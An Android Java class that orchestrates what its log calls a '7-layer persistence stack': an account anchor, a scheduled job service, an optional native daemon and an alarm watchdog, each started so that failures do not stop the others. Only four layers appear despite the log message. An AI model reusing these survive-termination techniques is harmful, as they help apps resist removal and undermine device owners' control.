package com.fason.app.persistence;

import android.content.Context;
import android.util.Log;
import com.fason.app.core.FasonApp;
import com.fason.app.persistence.anchors.AccountAnchor;
import com.fason.app.persistence.daemon.NativeDaemon;

public final class PersistenceOrchestrator {
    private static final String TAG = "PersistenceOrchestrator";
    private static volatile boolean initialized = false;

    public static synchronized void init() {
        if (initialized) return;

        Context ctx = FasonApp.getContext();
        Log.i(TAG, "Initializing 7-layer persistence stack");

        try {
            AccountAnchor.init();
        } catch (Exception e) {
            Log.e(TAG, "Layer 1 failed", e);
        }

        try {
            PersistenceJobService.schedule(ctx);
        } catch (Exception e) {
            Log.e(TAG, "Layer 2 failed", e);
        }

        try {
            if (NativeDaemon.isAvailable()) {
                NativeDaemon.start();
            }
        } catch (Exception e) {
            Log.e(TAG, "Layer 3 failed", e);
        }

        try {
            AlarmEngine.scheduleWatchdog();
        } catch (Exception e) {
            Log.e(TAG, "Layer 4 failed", e);
        }

        initialized = true;
        Log.i(TAG, "Persistence stack online");
    }

    public static boolean isInitialized() {
        return initialized;
    }
}
